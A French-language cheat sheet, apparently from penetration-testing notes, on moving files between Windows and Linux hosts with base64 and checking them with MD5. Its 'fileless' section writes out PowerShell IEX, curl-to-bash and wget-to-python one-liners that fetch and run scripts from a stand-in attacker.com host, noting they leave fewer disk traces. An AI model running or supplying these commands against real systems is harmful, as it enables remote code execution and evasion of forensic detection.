# Techniques Universelles de Transfert

## Encodage/Décodage Base64

L'encodage base64 permet de convertir un fichier binaire en texte ASCII, facilitant son transfert via des canaux textuels.

### Windows à Windows/Linux

```powershell
# Encodage sur la machine source
[Convert]::ToBase64String((Get-Content -Path "C:\path\to\file.exe" -Encoding Byte)) | Set-Content file.txt

# Décodage sur la machine cible (Windows)
[IO.File]::WriteAllBytes("C:\path\to\decoded.exe", [Convert]::FromBase64String((Get-Content -Path "file.txt")))

# Décodage sur la machine cible (Linux)
cat file.txt | base64 -d > decoded.exe
```

### Linux à Linux/Windows

```bash
# Encodage sur la machine source
cat file.bin | base64 -w 0 > file.txt

# Décodage sur la machine cible (Linux)
cat file.txt | base64 -d > file.bin

# Décodage sur la machine cible (Windows PowerShell)
[IO.File]::WriteAllBytes("file.bin", [Convert]::FromBase64String((Get-Content -Path "file.txt")))
```

## Vérification d'Intégrité

Toujours vérifier l'intégrité des fichiers transférés pour s'assurer qu'ils n'ont pas été altérés.

### Windows

```powershell
# Calculer le hash sur la machine source
Get-FileHash -Path C:\path\to\file.exe -Algorithm MD5

# Vérifier le hash sur la machine cible
Get-FileHash -Path C:\path\to\file.exe -Algorithm MD5
```

### Linux

```bash
# Calculer le hash sur la machine source
md5sum file.bin

# Vérifier le hash sur la machine cible
md5sum file.bin
```

## Transferts Fileless

Les transferts fileless permettent d'exécuter du code sans écrire sur le disque.

### Windows (PowerShell)

```powershell
# Télécharger et exécuter en mémoire
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Alternative
(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1') | IEX
```

### Linux (Bash)

```bash
# Télécharger et exécuter directement
curl -s http://attacker.com/script.sh | bash

# Alternative avec wget
wget -qO- http://attacker.com/script.py | python3
```

## Points Importants

- Toujours vérifier les hashes lors de transferts critiques
- Sur les systèmes restreints, l'encodage base64 est souvent disponible
- Les transferts fileless réduisent les traces sur le disque
- Préférer des méthodes chiffrées lorsque les données sont sensibles
- Tester diverses méthodes en fonction des restrictions du système